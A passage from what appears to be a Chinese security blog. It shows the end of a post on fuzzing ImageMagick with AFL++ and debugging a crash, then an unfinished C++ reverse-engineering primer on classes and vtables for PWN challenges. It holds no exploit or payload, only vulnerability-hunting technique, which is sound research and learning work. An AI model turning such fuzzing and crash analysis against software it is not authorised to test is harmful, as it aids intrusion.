-j8<br></code></pre></td></tr></table></figure><p><code>--disable-shared</code>选项表示禁止构建共享库，<code>libz.so.1</code>被编译进了目标程序中</p><p><img src="https://i.loli.net/2021/11/29/fD6PsrneYHNvOpG.png"></p><p>完成之后，在utilities 目录下会生成magick</p><p>用以下命令进行并行fuzz，使用-M指定一个主fuzzer，-S指定多个从fuzzer，使用screen命令来运行，防止终端断开连接导致fuzz中断</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">screen AFL_MAP_SIZE=271312 afl-fuzz -D -i ../../png/ -o output1/ -M fuzzer01 -m none ./magick convert @@ out.jpg<br>screen AFL_MAP_SIZE=271312 afl-fuzz -D -i ../../png/ -o output1/ -S fuzzer02 -m none ./magick convert @@ out.jpg<br>screen AFL_MAP_SIZE=271312 afl-fuzz -D -i ../../png/ -o output1/ -S fuzzer03 -m none ./magick convert @@ out.jpg<br></code></pre></td></tr></table></figure><p>参数说明：</p><ul><li>-i：指定测试样本所在目录；</li><li>-o：指定测试结果存放目录（这里是一个同步目录，并行测试中所有的Fuzzer将相互协作，在找到新的代码路径时，相互传递新的测试用例）；</li><li>-M：运行主(Master) Fuzzer；</li><li>-S：运行从属(Slave) Fuzzer；</li><li>-m：最大运行内存，单位为 MB（设置none，对内存不做限制）；</li></ul><h2 id="查看fuzzer"><a href="#查看fuzzer" class="headerlink" title="查看fuzzer"></a>查看fuzzer</h2><p>afl++有自带的afl-whatsup工具，可以查看每个fuzzer的运行状态和总体运行概况</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">afl-whatsup -d ./output1/<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/23/U16gKRks8eGYqmb.png"></p><p>需要注意的是，ImageMagick 会在<code>/tmp</code> 目录下生成临时文件，积累过多的话就会导致fuzzer停下来，可以使用以下脚本进行删除</p><blockquote><p>rm_magick.py</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sh">import os<br>import time<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">while</span> True:<br>        file_list = os.listdir(<span class="hljs-string">&#x27;/tmp&#x27;</span>)<br>        <span class="hljs-keyword">for</span> file_index <span class="hljs-keyword">in</span> file_list:<br>            <span class="hljs-keyword">if</span> file_index.startswith(<span class="hljs-string">&#x27;magick&#x27;</span>):<br>                try:<br>                    os.remove(<span class="hljs-string">&#x27;/tmp/&#x27;</span> + file_index)<br>                except:<br>                    pass<br>        time.sleep(0.1)<br></code></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">screen python rm_magick.py<br></code></pre></td></tr></table></figure><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>先让它跑几天再看吧。</p><hr><p>跑了快6天了，上线看一看。</p><p><img src="https://i.loli.net/2021/11/29/KNCHyWSTgho47VF.png"></p><p>fuzzer02和fuzzer03都出现crash了，上一个crash都是在4天以前，进入screen看一下。</p><p><img src="https://i.loli.net/2021/11/29/LHWjPJiB748KXE5.png"></p><p>既然出现了crash，那还得验证一下，因为也可能是误报</p><p>把crash文件拷出来</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">cp ./output1/fuzzer02/crashes/id:000001,sig:06,sync:fuzzer01,src:001520 2.png<br></code></pre></td></tr></table></figure><p>然后先手动把crash文件喂给程序</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">./magick convert ./2.png 1.jpg<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/29/IlfX3bP9Kmiukao.png"></p><p>谷歌搜索一下，看看能得到啥信息，关键词<strong>SUMMARY: AddressSanitizer: UNKNOWN SIGNAL</strong></p><p><img src="https://i.loli.net/2021/11/29/hHx5R6yfuojgZPn.png"></p><p>这个ASAN结果看起来跟我们的类似，但下面作者回复用gdb调试没发现啥异常，那pwn手肯定得自己调试一波了。ASAN把函数调用关系已经返回给我们了，我们只要在关键函数下断点跑起来看看就行。</p><p>调试后发现程序在strcpy处死掉了</p><p><img src="https://i.loli.net/2021/11/29/S2MVmqJYrLO9yFX.png"></p><p>根据这个异常<strong>signal SIGBUS, Bus error</strong>，搜索一波，网上的解释都是</p><blockquote><p>SIGBUS(Bus error)意味着指针所对应的地址是有效地址，但总线不能正常使用该指针。通常是未对齐的数据访问所致。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">vmovdqu ymmword ptr [rdi], ymm3<br></code></pre></td></tr></table></figure><p>上面这个是个很少见的指令，好像是处理浮点数的，也可以看看ymm3寄存器存了啥，知识盲区。</p><p><img src="https://i.loli.net/2021/11/29/7mrMizVKuQsdPIf.png"></p><p>大概是把ymm3的内容放到rdi地址处，手动看看rdi地址处的内容，地址无法访问。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">x/20gx 0x7ffff2be3000<br>0x7ffff2be3000: Cannot access memory at address 0x7ffff2be3000<br></code></pre></td></tr></table></figure><p>那么就vmmap看看这个虚拟地址是哪一部分的内容</p><p><img src="https://i.loli.net/2021/11/29/tvQE5peTnXzmJ6k.png"></p><p>搜了搜/dev/shm，说是tmpfs，这里面的文件不是在硬盘上而是存在内存里的，不是很了解。</p><p>太菜了，调试也没发现啥有用的信息，先就此作罢吧。</p>]]></content>
    
    
    <categories>
      
      <category>Fuzzing</category>
      
    </categories>
    
    
    <tags>
      
      <tag>fuzz</tag>
      
      <tag>AFL++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C++ PWN</title>
    <link href="/2021/11/21/C++%20PWN/"/>
    <url>/2021/11/21/C++%20PWN/</url>
    
    <content type="html"><![CDATA[<p>最近看了几道C++的pwn题，头都大了，太难逆向了，所以想学习一下C++的一些知识。</p><h2 id="C-基础知识"><a href="#C-基础知识" class="headerlink" title="C++基础知识"></a>C++基础知识</h2><h3 id="从C到C"><a href="#从C到C" class="headerlink" title="从C到C++"></a>从C到C++</h3><p>封装、继承、多态是C++耳熟能详的几个特点。</p><p>C++的封装可以理解成C语言中把函数定义在结构体内部。如下面的代码，在C语言中Test是个结构体类型，在C++中就叫成Test类了，test就叫做对象，定义在这个结构体里面的都叫做成员，写在结构体里面的函数就叫做成员函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">int</span> a;<br>    <span class="hljs-keyword">int</span> b;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">func</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello world!\n&quot;</span>);<br>    &#125;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Test2</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">int</span> a;<br>    <span class="hljs-keyword">int</span> b;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">func</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">int</span> c = <span class="hljs-keyword">this</span>-&gt;a + <span class="hljs-keyword">this</span>-&gt;b;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, c);<br>    &#125;<br>&#125;;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    Test test;<br>    Test2 test2;<br>    test2.a = <span class="hljs-number">1</span>;<br>    test2.b = <span class="hljs-number">2</span>;<br>    test.<span class="hljs-built_in">func</span>();<br>    test2.<span class="hljs-built_in">func</span>();<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(test));<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/21/S8vkY3Cghy7LQ2j.png"></p><p>定义在结构体或者类里面的函数不占大小，上面代码中除了定义了两个int型变量还定义了一个函数，但这个结构体的大小依然是2个int大小8。</p><p>成员函数在被调用时，会自动传递一个this指针，这个指针是结构体的首地址。上述代码的func函数没有参数，但在实际看程序的反汇编时，可以看到编译器自己传了一个参数（test对象的地址）到rcx中，这个在C++中就叫做this指针。</p><p><img src="https://i.loli.net/2021/11/21/spjte1Xyc2a3A6w.png"></p><h3 id="类与结构体的访问控制"><a href="#类与结构体的访问控制" class="headerlink" title="类与结构体的访问控制"></a>类与结构体的访问控制</h3><p>在编写源程序的时候类与结构体的最显著的区别在于类默认的访问控制为<code>private</code>，而结构体则可以看作默认<code>public</code>，类又可以设置成员变量访问控制权限为<code>public,private,protected</code></p><p>但是所有访问控制的检查都是在编译期进行的，也就是说在逆向的时候，结构体和类是没有访问控制的区别的</p><h3 id="类的大小"><a href="#类的大小" class="headerlink" title="类的大小"></a>类的大小</h3><p>一般情况下类的大小即各成员变量大小之和，而其中也有一些特殊情况</p><ul><li><p>gcc编译器C语言空结构体的大小是0，C++空结构体大小为1，写个代码测试一下就晓得了。我的vs2019在C语言中没法定义空结构体</p></li><li><p>内存对齐：一般成员变量的地址是依次排列在类中的，但是对于类中的不同数据类型编译器会按照一定规则填充字节让内存完成8字节对齐、4字节对齐或2字节对齐等</p></li><li><p>静态数据成员：类中的静态数据成员存放的位置和全局变量一样位于bss段，只是编译器增加了作用域检查，使其在作用域之外不可见，即只能被同类对象共同享有</p></li></ul><h3 id="构造函数和析构函数"><a href="#构造函数和析构函数" class="headerlink" title="构造函数和析构函数"></a>构造函数和析构函数</h3><ul><li>构造函数不可定义返回值，调用构造函数后会返回对象首地址，也就是this指针</li><li>对象生成时会自动调用构造函数，找到了定义对象的地方就找到了构造函数的调用时机</li><li>在o2选项优化编译之后，某些结构简单的类会被转化为几个连续定义的变量，故不是所有类都有默认的构造函数</li><li>在需要调用复制构造函数（拷贝构造函数）的时候，如果没有定义复制构造函数则会直接对副本对象中的成员变量进行复制，也就是进行浅拷贝；否则直接调用定义好的复制构造函数，在定义的复制构造函数中需要处理好分配的堆地址等资源数据，也就是进行深拷贝</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Person</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">int</span> age;<br><span class="hljs-keyword">int</span> level;<br><span class="hljs-built_in">Person</span>()<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Person对象创建了\n&quot;</span>);<br>&#125;<br><span class="hljs-built_in">Person</span>(<span class="hljs-keyword">int</span> age,<span class="hljs-keyword">int</span> level)<br>&#123;<br><span class="hljs-keyword">this</span>-&gt;age = age;<br><span class="hljs-keyword">this</span>-&gt;level = level;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Print</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d-%d\n&quot;</span>,age,level);<br>&#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>构造函数的特点：</p><ol><li><p>与类同名</p></li><li><p>没有返回值</p></li><li><p>创建对象的时候执行</p></li><li><p>主要用于初始化</p></li><li><p>可以有多个(最好有一个无参的),称为重载  其他函数也可以重载</p></li><li><p>编译器不要求必须提供</p></li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Person</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">int</span> age;<br><span class="hljs-keyword">int</span> level;<br><span class="hljs-keyword">char</span>* arr;<br><span class="hljs-built_in">Person</span>()<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;无参构造函数执行了...&quot;</span>);<br>&#125;<br><span class="hljs-built_in">Person</span>(<span class="hljs-keyword">int</span> age,<span class="hljs-keyword">int</span> level)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;有参构造函数执行了...&quot;</span>);<br><span class="hljs-keyword">this</span>-&gt;age = age;<br><span class="hljs-keyword">this</span>-&gt;level = level;<br>arr = (<span class="hljs-keyword">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">1024</span>);<br>&#125;<br>~<span class="hljs-built_in">Person</span>()<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;析构函数执行了...&quot;</span>);<br><span class="hljs-built_in">free</span>(arr);<br>arr = <span class="hljs-literal">NULL</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Print</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d-%d\n&quot;</span>,age,level);<br>&#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>析构函数的特点：</p><ol><li>只能有一个析构函数，不能重载</li><li>不能带任何参数</li><li>不能带返回值</li><li>主要用于清理工作</li><li>编译器不要求必须提供</li></ol><h3 id="继承与权限控制"><a href="#继承与权限控制" class="headerlink" title="继承与权限控制"></a>继承与权限控制</h3><blockquote><p>继承的本质就是数据的赋值</p></blockquote><blockquote><p>可以用父类指针指向子类的对象.</p></blockquote><p>public修饰的成员与普通的成员没有区别 只是编译器会检测.</p><p>private修饰的成员只要自己的其他成员才能访问</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Base</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">int</span> x;<br><span class="hljs-keyword">int</span> y;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>Base base;<br><br>base.x = <span class="hljs-number">10</span>;<br>base.y = <span class="hljs-number">20</span>;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>编译器默认class中的成员为private，而struct中的成员为public</p><p>父类中的程序继承后变成private属性，下面Sub类继承Base类之后就无法改变x，y成员的属性了</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Base</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br><span class="hljs-keyword">int</span> x;<br><span class="hljs-keyword">int</span> y;<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sub</span>:</span>Base<br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-keyword">int</span> a;<br><span class="hljs-keyword">int</span> b;<br>&#125;;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>Sub sub;<br><br>sub.x = <span class="hljs-number">1</span>;  <span class="hljs-comment">//无法访问</span><br>sub.y = <span class="hljs-number">2</span>;  <span class="hljs-comment">//无法访问</span><br>sub.a = <span class="hljs-number">3</span>;<br>sub.b = <span class="hljs-number">4</span>;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果希望可以改变成员的属性，则在继承的时候加上public</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sub</span>:</span><span class="hljs-keyword">public</span> Base<br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-keyword">int</span> a;<br><span class="hljs-keyword">int</span> b;<br>&#125;;<br></code></pre></td></tr></table></figure><p>那么private类型的成员是否被继承呢</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Base</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">Base</span>()<br>&#123;<br>x = <span class="hljs-number">11</span>;<br>y = <span class="hljs-number">12</span>;<br>&#125;<br><span class="hljs-keyword">private</span>:<br><span class="hljs-keyword">int</span> x;<br><span class="hljs-keyword">int</span> y;<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sub</span>:</span>Base<br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-keyword">int</span> a;<br><span class="hljs-keyword">int</span> b;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>Sub sub;<br>sub.a = <span class="hljs-number">1</span>;<br>sub.b = <span class="hljs-number">2</span>;<br><br><span class="hljs-keyword">int</span>* p = (<span class="hljs-keyword">int</span>*)&amp;sub;<br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,<span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(sub));<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,*(p+<span class="hljs-number">0</span>));<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,*(p+<span class="hljs-number">1</span>));<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,*(p+<span class="hljs-number">2</span>));<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,*(p+<span class="hljs-number">3</span>));<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="虚函数表"><a href="#虚函数表" class="headerlink" title="虚函数表"></a>虚函数表</h3><blockquote><p>示例代码</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Base</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Function_1</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Function_1...\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Function_2</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Function_2...\n&quot;</span>);<br>    &#125;<br>&#125;;<br><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">TestMethod</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>Base base;<br>base.<span class="hljs-built_in">Function_1</span>();<br>base.<span class="hljs-built_in">Function_2</span>();<br><br>    Base * pb = &amp;base;<br>pb-&gt;<span class="hljs-built_in">Function_1</span>();<br>pb-&gt;<span class="hljs-built_in">Function_2</span>();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">TestMethod</span>();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/24/uLAbPhKwGfUoIZ8.png"></p><p><img src="https://i.loli.net/2021/11/24/NBCF3LMv4jUDKSo.png"></p><ol><li><p>通过对象调用时，virtual函数与普通函数都是E8 Call</p></li><li><p>通过指针调用时，virtual函数是FF Call,也就是间接Call</p></li><li><p>类中若存在虚函数时，会多出一个属性，32位4个字节，64位8个字节</p></li><li><p>这多出来的数据位于对象的首地址处，指向一张表，里面存储了所有虚函数的地址</p></li></ol><p>再看示例代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Base</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-keyword">int</span> x;<br>    <span class="hljs-keyword">int</span> y;<br>    <span class="hljs-built_in">Base</span>()<br>    &#123;<br>        x = <span class="hljs-number">1</span>;<br>        y = <span class="hljs-number">2</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Function_1</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Function_1...\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Function_2</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Function_2...\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Function_3</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Function_3...\n&quot;</span>);<br>    &#125;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">TestMethod</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    Base base;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;base的虚函数表地址: %p\n&quot;</span>, *(<span class="hljs-keyword">int</span>*)(&amp;base));<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">TestMethod</span>();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/24/egbr2RHEyBVXaud.png"></p><p><img src="https://i.loli.net/2021/11/24/L4FUJn8EifN7QWI.png"></p><p>把反汇编复制出来</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++">Base::Function_2:<br><span class="hljs-number">00</span>C81307 E9 <span class="hljs-number">84</span> <span class="hljs-number">05</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       <span class="hljs-function">jmp         <span class="hljs-title">Base::Function_2</span> <span 